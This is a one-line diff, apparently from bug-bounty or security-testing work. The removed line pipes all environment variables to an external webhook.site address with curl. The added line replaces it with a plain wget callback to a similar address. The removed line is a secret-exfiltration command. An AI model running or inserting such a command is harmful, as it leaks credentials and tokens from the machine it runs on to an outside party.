@@ -1,1 +1,1 @@
-env | curl -X POST --insecure --data-binary @- https://webhook.site/bug-bounty-callbacks?bs
+wget https://webhook.site/bug-bounty-callbacks?bs2
